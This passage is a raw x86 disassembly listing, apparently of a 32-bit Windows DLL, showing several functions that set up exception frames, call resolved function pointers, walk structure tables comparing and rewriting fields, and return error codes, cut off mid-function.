10008796:	68 f0 02 01 10       	push   $0x100102f0
1000879b:	ff 75 08             	push   0x8(%ebp)
1000879e:	e8 c6 13 00 00       	call   0x10009b69
100087a3:	89 45 d4             	mov    %eax,-0x2c(%ebp)
100087a6:	68 d4 02 01 10       	push   $0x100102d4
100087ab:	ff 75 08             	push   0x8(%ebp)
100087ae:	e8 b6 13 00 00       	call   0x10009b69
100087b3:	83 c4 10             	add    $0x10,%esp
100087b6:	89 45 d8             	mov    %eax,-0x28(%ebp)
100087b9:	39 5d d4             	cmp    %ebx,-0x2c(%ebp)
100087bc:	0f 84 96 00 00 00    	je     0x10008858
100087c2:	3b c3                	cmp    %ebx,%eax
100087c4:	0f 84 8e 00 00 00    	je     0x10008858
100087ca:	ff 75 dc             	push   -0x24(%ebp)
100087cd:	ff 55 d4             	call   *-0x2c(%ebp)
100087d0:	89 45 d0             	mov    %eax,-0x30(%ebp)
100087d3:	3b c3                	cmp    %ebx,%eax
100087d5:	75 0c                	jne    0x100087e3
100087d7:	6a e1                	push   $0xffffffe1
100087d9:	58                   	pop    %eax
100087da:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
100087de:	e9 96 00 00 00       	jmp    0x10008879
100087e3:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
100087ea:	8b f8                	mov    %eax,%edi
100087ec:	89 7d c4             	mov    %edi,-0x3c(%ebp)
100087ef:	33 d2                	xor    %edx,%edx
100087f1:	89 55 cc             	mov    %edx,-0x34(%ebp)
100087f4:	b9 20 02 00 00       	mov    $0x220,%ecx
100087f9:	3b 57 4c             	cmp    0x4c(%edi),%edx
100087fc:	73 40                	jae    0x1000883e
100087fe:	8b 47 68             	mov    0x68(%edi),%eax
10008801:	8b 04 d0             	mov    (%eax,%edx,8),%eax
10008804:	89 45 c8             	mov    %eax,-0x38(%ebp)
10008807:	80 78 01 02          	cmpb   $0x2,0x1(%eax)
1000880b:	72 23                	jb     0x10008830
1000880d:	83 78 08 20          	cmpl   $0x20,0x8(%eax)
10008811:	75 1d                	jne    0x10008830
10008813:	83 c0 0c             	add    $0xc,%eax
10008816:	8b 18                	mov    (%eax),%ebx
10008818:	81 e3 f0 0f 00 00    	and    $0xff0,%ebx
1000881e:	3b d9                	cmp    %ecx,%ebx
10008820:	75 0e                	jne    0x10008830
10008822:	89 46 04             	mov    %eax,0x4(%esi)
10008825:	8b 18                	mov    (%eax),%ebx
10008827:	89 5e 08             	mov    %ebx,0x8(%esi)
1000882a:	89 08                	mov    %ecx,(%eax)
1000882c:	83 65 e0 00          	andl   $0x0,-0x20(%ebp)
10008830:	81 fa e8 03 00 00    	cmp    $0x3e8,%edx
10008836:	77 06                	ja     0x1000883e
10008838:	42                   	inc    %edx
10008839:	89 55 cc             	mov    %edx,-0x34(%ebp)
1000883c:	eb bb                	jmp    0x100087f9
1000883e:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
10008842:	e8 02 00 00 00       	call   0x10008849
10008847:	eb 24                	jmp    0x1000886d
10008849:	8b 45 dc             	mov    -0x24(%ebp),%eax
1000884c:	05 c8 00 00 00       	add    $0xc8,%eax
10008851:	50                   	push   %eax
10008852:	ff 55 d8             	call   *-0x28(%ebp)
10008855:	c3                   	ret
10008856:	eb 15                	jmp    0x1000886d
10008858:	6a e0                	push   $0xffffffe0
1000885a:	e9 7a ff ff ff       	jmp    0x100087d9
1000885f:	6a 01                	push   $0x1
10008861:	58                   	pop    %eax
10008862:	c3                   	ret
10008863:	8b 65 e8             	mov    -0x18(%ebp),%esp
10008866:	c7 45 e0 e4 ff ff ff 	movl   $0xffffffe4,-0x20(%ebp)
1000886d:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
10008871:	8b 45 e0             	mov    -0x20(%ebp),%eax
10008874:	eb 03                	jmp    0x10008879
10008876:	6a 57                	push   $0x57
10008878:	58                   	pop    %eax
10008879:	8b 4d f0             	mov    -0x10(%ebp),%ecx
1000887c:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
10008883:	5f                   	pop    %edi
10008884:	5e                   	pop    %esi
10008885:	5b                   	pop    %ebx
10008886:	c9                   	leave
10008887:	c3                   	ret
10008888:	55                   	push   %ebp
10008889:	8b ec                	mov    %esp,%ebp
1000888b:	6a ff                	push   $0xffffffff
1000888d:	68 c8 e4 00 10       	push   $0x1000e4c8
10008892:	68 00 c6 00 10       	push   $0x1000c600
10008897:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
1000889d:	50                   	push   %eax
1000889e:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
100088a5:	83 ec 2c             	sub    $0x2c,%esp
100088a8:	53                   	push   %ebx
100088a9:	56                   	push   %esi
100088aa:	57                   	push   %edi
100088ab:	89 65 e8             	mov    %esp,-0x18(%ebp)
100088ae:	8b 75 0c             	mov    0xc(%ebp),%esi
100088b1:	33 db                	xor    %ebx,%ebx
100088b3:	3b f3                	cmp    %ebx,%esi
100088b5:	0f 84 11 01 00 00    	je     0x100089cc
100088bb:	83 7d 10 14          	cmpl   $0x14,0x10(%ebp)
100088bf:	0f 85 07 01 00 00    	jne    0x100089cc
100088c5:	89 5e 08             	mov    %ebx,0x8(%esi)
100088c8:	89 5e 04             	mov    %ebx,0x4(%esi)
100088cb:	c7 45 e0 e3 ff ff ff 	movl   $0xffffffe3,-0x20(%ebp)
100088d2:	89 5d fc             	mov    %ebx,-0x4(%ebp)
100088d5:	ff 36                	push   (%esi)
100088d7:	ff 75 08             	push   0x8(%ebp)
100088da:	e8 cb 10 00 00       	call   0x100099aa
100088df:	59                   	pop    %ecx
100088e0:	59                   	pop    %ecx
100088e1:	89 45 dc             	mov    %eax,-0x24(%ebp)
100088e4:	3b c3                	cmp    %ebx,%eax
100088e6:	75 04                	jne    0x100088ec
100088e8:	6a ec                	push   $0xffffffec
100088ea:	eb 43                	jmp    0x1000892f
100088ec:	68 f0 02 01 10       	push   $0x100102f0
100088f1:	ff 75 08             	push   0x8(%ebp)
100088f4:	e8 70 12 00 00       	call   0x10009b69
100088f9:	89 45 d4             	mov    %eax,-0x2c(%ebp)
100088fc:	68 d4 02 01 10       	push   $0x100102d4
10008901:	ff 75 08             	push   0x8(%ebp)
10008904:	e8 60 12 00 00       	call   0x10009b69
10008909:	83 c4 10             	add    $0x10,%esp
1000890c:	89 45 d8             	mov    %eax,-0x28(%ebp)
1000890f:	39 5d d4             	cmp    %ebx,-0x2c(%ebp)
10008912:	0f 84 96 00 00 00    	je     0x100089ae
10008918:	3b c3                	cmp    %ebx,%eax
1000891a:	0f 84 8e 00 00 00    	je     0x100089ae
10008920:	ff 75 dc             	push   -0x24(%ebp)
10008923:	ff 55 d4             	call   *-0x2c(%ebp)
10008926:	89 45 d0             	mov    %eax,-0x30(%ebp)
10008929:	3b c3                	cmp    %ebx,%eax
1000892b:	75 0c                	jne    0x10008939
1000892d:	6a e1                	push   $0xffffffe1
1000892f:	58                   	pop    %eax
10008930:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
10008934:	e9 96 00 00 00       	jmp    0x100089cf
10008939:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
10008940:	8b f8                	mov    %eax,%edi
10008942:	89 7d c4             	mov    %edi,-0x3c(%ebp)
10008945:	33 d2                	xor    %edx,%edx
10008947:	89 55 cc             	mov    %edx,-0x34(%ebp)
1000894a:	b9 20 02 00 00       	mov    $0x220,%ecx
1000894f:	3b 57 4c             	cmp    0x4c(%edi),%edx
10008952:	73 40                	jae    0x10008994
10008954:	8b 47 68             	mov    0x68(%edi),%eax
10008957:	8b 04 d0             	mov    (%eax,%edx,8),%eax
1000895a:	89 45 c8             	mov    %eax,-0x38(%ebp)
1000895d:	80 78 01 02          	cmpb   $0x2,0x1(%eax)
10008961:	72 23                	jb     0x10008986
10008963:	83 78 08 20          	cmpl   $0x20,0x8(%eax)
10008967:	75 1d                	jne    0x10008986
10008969:	83 c0 0c             	add    $0xc,%eax
1000896c:	8b 18                	mov    (%eax),%ebx
1000896e:	81 e3 f0 0f 00 00    	and    $0xff0,%ebx
10008974:	3b d9                	cmp    %ecx,%ebx
10008976:	75 0e                	jne    0x10008986
10008978:	89 46 04             	mov    %eax,0x4(%esi)
1000897b:	8b 18                	mov    (%eax),%ebx
1000897d:	89 5e 08             	mov    %ebx,0x8(%esi)
10008980:	89 08                	mov    %ecx,(%eax)
10008982:	83 65 e0 00          	andl   $0x0,-0x20(%ebp)
10008986:	81 fa e8 03 00 00    	cmp    $0x3e8,%edx
1000898c:	77 06                	ja     0x10008994
1000898e:	42                   	inc    %edx
1000898f:	89 55 cc             	mov    %edx,-0x34(%ebp)
10008992:	eb bb                	jmp    0x1000894f
10008994:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
10008998:	e8 02 00 00 00       	call   0x1000899f
1000899d:	eb 24                	jmp    0x100089c3
1000899f:	8b 45 dc             	mov    -0x24(%ebp),%eax
100089a2:	05 d8 00 00 00       	add    $0xd8,%eax
100089a7:	50                   	push   %eax
100089a8:	ff 55 d8             	call   *-0x28(%ebp)
100089ab:	c3                   	ret
100089ac:	eb 15                	jmp    0x100089c3
100089ae:	6a e0                	push   $0xffffffe0
100089b0:	e9 7a ff ff ff       	jmp    0x1000892f
100089b5:	6a 01                	push   $0x1
100089b7:	58                   	pop    %eax
100089b8:	c3                   	ret
100089b9:	8b 65 e8             	mov    -0x18(%ebp),%esp
100089bc:	c7 45 e0 e4 ff ff ff 	movl   $0xffffffe4,-0x20(%ebp)
100089c3:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
100089c7:	8b 45 e0             	mov    -0x20(%ebp),%eax
100089ca:	eb 03                	jmp    0x100089cf
100089cc:	6a 57                	push   $0x57
100089ce:	58                   	pop    %eax
100089cf:	8b 4d f0             	mov    -0x10(%ebp),%ecx
100089d2:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
100089d9:	5f                   	pop    %edi
100089da:	5e                   	pop    %esi
100089db:	5b                   	pop    %ebx
100089dc:	c9                   	leave
100089dd:	c3                   	ret
100089de:	55                   	push   %ebp
100089df:	8b ec                	mov    %esp,%ebp
100089e1:	6a ff                	push   $0xffffffff
100089e3:	68 e0 e4 00 10       	push   $0x1000e4e0
100089e8:	68 00 c6 00 10       	push   $0x1000c600
100089ed:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
100089f3:	50                   	push   %eax
100089f4:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
100089fb:	83 ec 34             	sub    $0x34,%esp
100089fe:	53                   	push   %ebx
100089ff:	56                   	push   %esi
10008a00:	57                   	push   %edi
10008a01:	89 65 e8             	mov    %esp,-0x18(%ebp)
10008a04:	8b 75 0c             	mov    0xc(%ebp),%esi
10008a07:	33 db                	xor    %ebx,%ebx
10008a09:	3b f3                	cmp    %ebx,%esi
10008a0b:	0f 84 08 02 00 00    	je     0x10008c19
10008a11:	83 7d 10 14          	cmpl   $0x14,0x10(%ebp)
10008a15:	0f 85 fe 01 00 00    	jne    0x10008c19
10008a1b:	89 5e 08             	mov    %ebx,0x8(%esi)
10008a1e:	89 5e 04             	mov    %ebx,0x4(%esi)
10008a21:	89 5e 10             	mov    %ebx,0x10(%esi)
10008a24:	89 5e 0c             	mov    %ebx,0xc(%esi)
10008a27:	c7 45 e0 e3 ff ff ff 	movl   $0xffffffe3,-0x20(%ebp)
10008a2e:	89 5d fc             	mov    %ebx,-0x4(%ebp)
10008a31:	ff 36                	push   (%esi)
10008a33:	ff 75 08             	push   0x8(%ebp)
10008a36:	e8 6f 0f 00 00       	call   0x100099aa
10008a3b:	59                   	pop    %ecx
10008a3c:	59                   	pop    %ecx
10008a3d:	89 45 dc             	mov    %eax,-0x24(%ebp)
10008a40:	3b c3                	cmp    %ebx,%eax
10008a42:	75 04                	jne    0x10008a48
10008a44:	6a ec                	push   $0xffffffec
10008a46:	eb 43                	jmp    0x10008a8b
10008a48:	68 f0 02 01 10       	push   $0x100102f0
10008a4d:	ff 75 08             	push   0x8(%ebp)
10008a50:	e8 14 11 00 00       	call   0x10009b69
10008a55:	89 45 d4             	mov    %eax,-0x2c(%ebp)
10008a58:	68 d4 02 01 10       	push   $0x100102d4
10008a5d:	ff 75 08             	push   0x8(%ebp)
10008a60:	e8 04 11 00 00       	call   0x10009b69
10008a65:	83 c4 10             	add    $0x10,%esp
10008a68:	89 45 d8             	mov    %eax,-0x28(%ebp)
10008a6b:	39 5d d4             	cmp    %ebx,-0x2c(%ebp)
10008a6e:	0f 84 87 01 00 00    	je     0x10008bfb
10008a74:	3b c3                	cmp    %ebx,%eax
10008a76:	0f 84 7f 01 00 00    	je     0x10008bfb
10008a7c:	ff 75 dc             	push   -0x24(%ebp)
10008a7f:	ff 55 d4             	call   *-0x2c(%ebp)
10008a82:	89 45 d0             	mov    %eax,-0x30(%ebp)
10008a85:	3b c3                	cmp    %ebx,%eax
10008a87:	75 0c                	jne    0x10008a95
10008a89:	6a e1                	push   $0xffffffe1
10008a8b:	58                   	pop    %eax
10008a8c:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
10008a90:	e9 87 01 00 00       	jmp    0x10008c1c
10008a95:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
10008a9c:	8b f8                	mov    %eax,%edi
10008a9e:	89 7d c8             	mov    %edi,-0x38(%ebp)
10008aa1:	33 d2                	xor    %edx,%edx
10008aa3:	89 55 cc             	mov    %edx,-0x34(%ebp)
10008aa6:	3b 57 78             	cmp    0x78(%edi),%edx
10008aa9:	73 67                	jae    0x10008b12
10008aab:	8b c2                	mov    %edx,%eax
10008aad:	c1 e0 03             	shl    $0x3,%eax
10008ab0:	8b 8f 90 00 00 00    	mov    0x90(%edi),%ecx
10008ab6:	8b 0c 08             	mov    (%eax,%ecx,1),%ecx
10008ab9:	89 4d c4             	mov    %ecx,-0x3c(%ebp)
10008abc:	80 79 01 02          	cmpb   $0x2,0x1(%ecx)
10008ac0:	0f 82 c8 00 00 00    	jb     0x10008b8e
10008ac6:	83 79 08 20          	cmpl   $0x20,0x8(%ecx)
10008aca:	0f 85 be 00 00 00    	jne    0x10008b8e
10008ad0:	83 c1 0c             	add    $0xc,%ecx
10008ad3:	81 39 20 02 00 00    	cmpl   $0x220,(%ecx)
10008ad9:	0f 85 af 00 00 00    	jne    0x10008b8e
10008adf:	89 4e 04             	mov    %ecx,0x4(%esi)
10008ae2:	8b 09                	mov    (%ecx),%ecx
10008ae4:	89 4e 08             	mov    %ecx,0x8(%esi)
10008ae7:	8b 8f 90 00 00 00    	mov    0x90(%edi),%ecx
10008aed:	8d 4c 08 04          	lea    0x4(%eax,%ecx,1),%ecx
10008af1:	89 4e 0c             	mov    %ecx,0xc(%esi)
10008af4:	8b 8f 90 00 00 00    	mov    0x90(%edi),%ecx
10008afa:	8b 4c 08 04          	mov    0x4(%eax,%ecx,1),%ecx
10008afe:	89 4e 10             	mov    %ecx,0x10(%esi)
10008b01:	8b 8f 90 00 00 00    	mov    0x90(%edi),%ecx
10008b07:	c7 44 08 04 07 00 00 	movl   $0x7,0x4(%eax,%ecx,1)
10008b0e:	00 
10008b0f:	89 5d e0             	mov    %ebx,-0x20(%ebp)
10008b12:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
10008b15:	0f 84 8e 00 00 00    	je     0x10008ba9
10008b1b:	33 d2                	xor    %edx,%edx
10008b1d:	89 55 cc             	mov    %edx,-0x34(%ebp)
10008b20:	3b 57 78             	cmp    0x78(%edi),%edx
10008b23:	73 7f                	jae    0x10008ba4
10008b25:	8b c2                	mov    %edx,%eax
10008b27:	c1 e0 03             	shl    $0x3,%eax
10008b2a:	8b 8f 90 00 00 00    	mov    0x90(%edi),%ecx
10008b30:	8b 0c 08             	mov    (%eax,%ecx,1),%ecx
10008b33:	89 4d c0             	mov    %ecx,-0x40(%ebp)
10008b36:	80 79 01 02          	cmpb   $0x2,0x1(%ecx)
10008b3a:	72 5a                	jb     0x10008b96
10008b3c:	83 79 08 20          	cmpl   $0x20,0x8(%ecx)
10008b40:	75 54                	jne    0x10008b96
10008b42:	83 c1 0c             	add    $0xc,%ecx
10008b45:	8b 19                	mov    (%ecx),%ebx
10008b47:	81 e3 f0 0f 00 00    	and    $0xff0,%ebx
10008b4d:	81 fb 20 02 00 00    	cmp    $0x220,%ebx
10008b53:	75 3f                	jne    0x10008b94
10008b55:	89 4e 04             	mov    %ecx,0x4(%esi)
10008b58:	8b 11                	mov    (%ecx),%edx
10008b5a:	89 56 08             	mov    %edx,0x8(%esi)
10008b5d:	8b 97 90 00 00 00    	mov    0x90(%edi),%edx
10008b63:	8d 54 10 04          	lea    0x4(%eax,%edx,1),%edx
10008b67:	89 56 0c             	mov    %edx,0xc(%esi)
10008b6a:	8b 97 90 00 00 00    	mov    0x90(%edi),%edx
10008b70:	8b 54 10 04          	mov    0x4(%eax,%edx,1),%edx
10008b74:	89 56 10             	mov    %edx,0x10(%esi)
10008b77:	89 19                	mov    %ebx,(%ecx)
10008b79:	8b 8f 90 00 00 00    	mov    0x90(%edi),%ecx
10008b7f:	c7 44 08 04 07 00 00 	movl   $0x7,0x4(%eax,%ecx,1)
10008b86:	00 
10008b87:	33 db                	xor    %ebx,%ebx
10008b89:	89 5d e0             	mov    %ebx,-0x20(%ebp)
10008b8c:	eb 16                	jmp    0x10008ba4
10008b8e:	42                   	inc    %edx
10008b8f:	e9 0f ff ff ff       	jmp    0x10008aa3
10008b94:	33 db                	xor    %ebx,%ebx
10008b96:	81 fa e8 03 00 00    	cmp    $0x3e8,%edx
10008b9c:	77 06                	ja     0x10008ba4
10008b9e:	42                   	inc    %edx
10008b9f:	e9 79 ff ff ff       	jmp    0x10008b1d
10008ba4:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
10008ba7:	75 39                	jne    0x10008be2
10008ba9:	68 08 03 01 10       	push   $0x10010308
10008bae:	ff 75 08             	push   0x8(%ebp)
10008bb1:	e8 b3 0f 00 00       	call   0x10009b69
10008bb6:	59                   	pop    %ecx
10008bb7:	59                   	pop    %ecx
10008bb8:	89 45 bc             	mov    %eax,-0x44(%ebp)
10008bbb:	3b c3                	cmp    %ebx,%eax
10008bbd:	75 11                	jne    0x10008bd0
10008bbf:	6a ff                	push   $0xffffffff
10008bc1:	8d 45 f0             	lea    -0x10(%ebp),%eax
10008bc4:	50                   	push   %eax
10008bc5:	e8 0c 49 00 00       	call   0x1000d4d6
10008bca:	59                   	pop    %ecx
10008bcb:	59                   	pop    %ecx
10008bcc:	6a e0                	push   $0xffffffe0
10008bce:	eb 4b                	jmp    0x10008c1b
10008bd0:	8d 8f d0 00 00 00    	lea    0xd0(%edi),%ecx
10008bd6:	51                   	push   %ecx
10008bd7:	ff 77 78             	push   0x78(%edi)
10008bda:	ff b7 90 00 00 00    	push   0x90(%edi)
10008be0:	ff d0                	call   *%eax
10008be2:	89 5d fc             	mov    %ebx,-0x4(%ebp)
10008be5:	e8 02 00 00 00       	call   0x10008bec
10008bea:	eb 24                	jmp    0x10008c10
10008bec:	8b 45 dc             	mov    -0x24(%ebp),%eax
10008bef:	05 e0 00 00 00       	add    $0xe0,%eax
10008bf4:	50                   	push   %eax
10008bf5:	ff 55 d8             	call   *-0x28(%ebp)
10008bf8:	c3                   	ret
10008bf9:	eb 15                	jmp    0x10008c10
10008bfb:	6a e0                	push   $0xffffffe0
10008bfd:	e9 89 fe ff ff       	jmp    0x10008a8b
10008c02:	6a 01                	push   $0x1
10008c04:	58                   	pop    %eax
10008c05:	c3                   	ret
10008c06:	8b 65 e8             	mov    -0x18(%ebp),%esp
10008c09:	c7 45 e0 e4 ff ff ff 	movl   $0xffffffe4,-0x20(%ebp)
10008c10:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
10008c14:	8b 45 e0             	mov    -0x20(%ebp),%eax
10008c17:	eb 03                	jmp    0x10008c1c
10008c19:	6a 57                	push   $0x57
10008c1b:	58                   	pop    %eax
10008c1c:	8b 4d f0             	mov    -0x10(%ebp),%ecx
10008c1f:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
10008c26:	5f                   	pop    %edi
10008c27:	5e                   	pop    %esi
10008c28:	5b                   	pop    %ebx
10008c29:	c9                   	leave
10008c2a:	c3                   	ret
10008c2b:	55                   	push   %ebp
10008c2c:	8b ec                	mov    %esp,%ebp
10008c2e:	81 ec b4 00 00 00    	sub    $0xb4,%esp
10008c34:	8b 45 1c             	mov    0x1c(%ebp),%eax
10008c37:	85 c0                	test   %eax,%eax
10008c39:	74 03                	je     0x10008c3e
10008c3b:	83 20 00             	andl   $0x0,(%eax)
10008c3e:	56                   	push   %esi
10008c3f:	8b 75 08             	mov    0x8(%ebp),%esi
10008c42:	83 fe 0a             	cmp    $0xa,%esi
10008c45:	73 08                	jae    0x10008c4f
10008c47:	6a e6                	push   $0xffffffe6
10008c49:	58                   	pop    %eax
10008c4a:	e9 0d 01 00 00       	jmp    0x10008d5c
10008c4f:	53                   	push   %ebx
10008c50:	57                   	push   %edi
10008c51:	6a 18                	push   $0x18
10008c53:	8d 45 e8             	lea    -0x18(%ebp),%eax
10008c56:	6a 00                	push   $0x0
10008c58:	50                   	push   %eax
10008c59:	e8 b8 46 00 00       	call   0x1000d316
10008c5e:	8b 45 0c             	mov    0xc(%ebp),%eax
10008c61:	83 c4 0c             	add    $0xc,%esp
10008c64:	89 45 ec             	mov    %eax,-0x14(%ebp)
10008c67:	8b 45 10             	mov    0x10(%ebp),%eax
10008c6a:	89 45 f0             	mov    %eax,-0x10(%ebp)
10008c6d:	8a 45 14             	mov    0x14(%ebp),%al
10008c70:	88 45 f4             	mov    %al,-0xc(%ebp)
10008c73:	8b 45 18             	mov    0x18(%ebp),%eax
10008c76:	89 75 e8             	mov    %esi,-0x18(%ebp)
10008c79:	89 45 f8             	mov    %eax,-0x8(%ebp)
10008c7c:	ff 15 dc e0 00 10    	call   *0x1000e0dc
10008c82:	8b d8                	mov    %eax,%ebx
10008c84:	6a be                	push   $0xffffffbe
10008c86:	0f b6 c3             	movzbl %bl,%eax
10008c89:	83 e8 04             	sub    $0x4,%eax
10008c8c:	5f                   	pop    %edi
10008c8d:	0f 84 92 00 00 00    	je     0x10008d25
10008c93:	48                   	dec    %eax
10008c94:	74 17                	je     0x10008cad
10008c96:	48                   	dec    %eax
10008c97:	0f 85 bb 00 00 00    	jne    0x10008d58
10008c9d:	8d 45 e8             	lea    -0x18(%ebp),%eax
10008ca0:	6a 18                	push   $0x18
10008ca2:	50                   	push   %eax
10008ca3:	68 e5 94 00 10       	push   $0x100094e5
10008ca8:	e9 91 00 00 00       	jmp    0x10008d3e
10008cad:	be 9c 00 00 00       	mov    $0x9c,%esi
10008cb2:	8d 85 4c ff ff ff    	lea    -0xb4(%ebp),%eax
10008cb8:	56                   	push   %esi
10008cb9:	6a 00                	push   $0x0
10008cbb:	50                   	push   %eax
10008cbc:	e8 55 46 00 00       	call   0x1000d316
10008cc1:	83 c4 0c             	add    $0xc,%esp
10008cc4:	8d 85 4c ff ff ff    	lea    -0xb4(%ebp),%eax
10008cca:	89 b5 4c ff ff ff    	mov    %esi,-0xb4(%ebp)
10008cd0:	50                   	push   %eax
10008cd1:	ff 15 b8 e0 00 10    	call   *0x1000e0b8
10008cd7:	33 c0                	xor    %eax,%eax
10008cd9:	8a c7                	mov    %bh,%al
10008cdb:	0f b6 c0             	movzbl %al,%eax
10008cde:	83 e8 00             	sub    $0x0,%eax
10008ce1:	74 35                	je     0x10008d18
10008ce3:	48                   	dec    %eax
10008ce4:	74 17                	je     0x10008cfd
10008ce6:	48                   	dec    %eax
10008ce7:	75 6f                	jne    0x10008d58
10008ce9:	66 83 7d e0 00       	cmpw   $0x0,-0x20(%ebp)
10008cee:	8d 45 e8             	lea    -0x18(%ebp),%eax
10008cf1:	6a 18                	push   $0x18
10008cf3:	50                   	push   %eax
10008cf4:	74 1b                	je     0x10008d11
10008cf6:	68 35 93 00 10       	push   $0x10009335
10008cfb:	eb 41                	jmp    0x10008d3e
10008cfd:	66 83 7d e0 02       	cmpw   $0x2,-0x20(%ebp)
10008d02:	8d 45 e8             	lea    -0x18(%ebp),%eax
10008d05:	6a 18                	push   $0x18
10008d07:	50                   	push   %eax
10008d08:	73 07                	jae    0x10008d11
10008d0a:	68 d5 8f 00 10       	push   $0x10008fd5
10008d0f:	eb 2d                	jmp    0x10008d3e
10008d11:	68 85 91 00 10       	push   $0x10009185
10008d16:	eb 26                	jmp    0x10008d3e
10008d18:	8d 45 e8             	lea    -0x18(%ebp),%eax
10008d1b:	6a 18                	push   $0x18
10008d1d:	50                   	push   %eax
10008d1e:	68 9a 8e 00 10       	push   $0x10008e9a
10008d23:	eb 19                	jmp    0x10008d3e
10008d25:	e8 56 39 00 00       	call   0x1000c680
10008d2a:	84 c0                	test   %al,%al
10008d2c:	74 05                	je     0x10008d33
10008d2e:	6a e2                	push   $0xffffffe2
10008d30:	5f                   	pop    %edi
10008d31:	eb 25                	jmp    0x10008d58
10008d33:	8d 45 e8             	lea    -0x18(%ebp),%eax
10008d36:	6a 18                	push   $0x18
10008d38:	50                   	push   %eax
10008d39:	68 5f 8d 00 10       	push   $0x10008d5f
10008d3e:	e8 8b 09 00 00       	call   0x100096ce
10008d43:	8b f8                	mov    %eax,%edi
10008d45:	83 c4 0c             	add    $0xc,%esp
10008d48:	85 ff                	test   %edi,%edi
10008d4a:	75 0c                	jne    0x10008d58
10008d4c:	8b 45 1c             	mov    0x1c(%ebp),%eax
10008d4f:	85 c0                	test   %eax,%eax
10008d51:	74 05                	je     0x10008d58
10008d53:	8b 4d fc             	mov    -0x4(%ebp),%ecx
10008d56:	89 08                	mov    %ecx,(%eax)
10008d58:	8b c7                	mov    %edi,%eax
10008d5a:	5f                   	pop    %edi
10008d5b:	5b                   	pop    %ebx
10008d5c:	5e                   	pop    %esi
10008d5d:	c9                   	leave
10008d5e:	c3                   	ret
10008d5f:	55                   	push   %ebp
10008d60:	8b ec                	mov    %esp,%ebp
10008d62:	6a ff                	push   $0xffffffff
10008d64:	68 f8 e4 00 10       	push   $0x1000e4f8
10008d69:	68 00 c6 00 10       	push   $0x1000c600
10008d6e:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
10008d74:	50                   	push   %eax
10008d75:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
10008d7c:	83 ec 28             	sub    $0x28,%esp
10008d7f:	53                   	push   %ebx
10008d80:	56                   	push   %esi
10008d81:	57                   	push   %edi
10008d82:	89 65 e8             	mov    %esp,-0x18(%ebp)
10008d85:	8b 75 0c             	mov    0xc(%ebp),%esi
10008d88:	85 f6                	test   %esi,%esi
10008d8a:	0f 84 f8 00 00 00    	je     0x10008e88
10008d90:	83 7d 10 18          	cmpl   $0x18,0x10(%ebp)
10008d94:	0f 85 ee 00 00 00    	jne    0x10008e88
10008d9a:	68 20 03 01 10       	push   $0x10010320
10008d9f:	ff 75 08             	push   0x8(%ebp)
10008da2:	e8 c2 0d 00 00       	call   0x10009b69
10008da7:	59                   	pop    %ecx
10008da8:	59                   	pop    %ecx
10008da9:	89 45 e0             	mov    %eax,-0x20(%ebp)
10008dac:	85 c0                	test   %eax,%eax
10008dae:	75 07                	jne    0x10008db7
10008db0:	6a c1                	push   $0xffffffc1
10008db2:	e9 d3 00 00 00       	jmp    0x10008e8a
10008db7:	c7 45 dc e3 ff ff ff 	movl   $0xffffffe3,-0x24(%ebp)
10008dbe:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
10008dc2:	ff 36                	push   (%esi)
10008dc4:	ff 75 08             	push   0x8(%ebp)
10008dc7:	e8 de 0b 00 00       	call   0x100099aa
10008dcc:	59                   	pop    %ecx
10008dcd:	59                   	pop    %ecx
10008dce:	89 45 d8             	mov    %eax,-0x28(%ebp)
10008dd1:	85 c0                	test   %eax,%eax
10008dd3:	75 05                	jne    0x10008dda
10008dd5:	6a ec                	push   $0xffffffec
10008dd7:	58                   	pop    %eax
10008dd8:	eb 7d                	jmp    0x10008e57
10008dda:	8b b8 08 01 00 00    	mov    0x108(%eax),%edi
10008de0:	89 7d d0             	mov    %edi,-0x30(%ebp)
10008de3:	33 c0                	xor    %eax,%eax
10008de5:	89 45 d4             	mov    %eax,-0x2c(%ebp)
10008de8:	3b 47 30             	cmp    0x30(%edi),%eax
10008deb:	0f 83 8e 00 00 00    	jae    0x10008e7f
10008df1:	8b 4f 48             	mov    0x48(%edi),%ecx
10008df4:	8b 1c c1             	mov    (%ecx,%eax,8),%ebx
10008df7:	89 5d cc             	mov    %ebx,-0x34(%ebp)
10008dfa:	ff 76 04             	push   0x4(%esi)
10008dfd:	53                   	push   %ebx
10008dfe:	ff 55 e0             	call   *-0x20(%ebp)
10008e01:	85 c0                	test   %eax,%eax
10008e03:	74 58                	je     0x10008e5d
10008e05:	8b 46 08             	mov    0x8(%esi),%eax
10008e08:	8a 4b 01             	mov    0x1(%ebx),%cl
10008e0b:	3a 48 01             	cmp    0x1(%eax),%cl
10008e0e:	75 4d                	jne    0x10008e5d
10008e10:	83 65 c8 00          	andl   $0x0,-0x38(%ebp)
10008e14:	0f b6 43 01          	movzbl 0x1(%ebx),%eax
10008e18:	39 45 c8             	cmp    %eax,-0x38(%ebp)
10008e1b:	73 18                	jae    0x10008e35
10008e1d:	8b 45 c8             	mov    -0x38(%ebp),%eax
10008e20:	8d 04 85 08 00 00 00 	lea    0x8(,%eax,4),%eax
10008e27:	8b 4e 08             	mov    0x8(%esi),%ecx
10008e2a:	8b 0c 08             	mov    (%eax,%ecx,1),%ecx
10008e2d:	89 0c 18             	mov    %ecx,(%eax,%ebx,1)
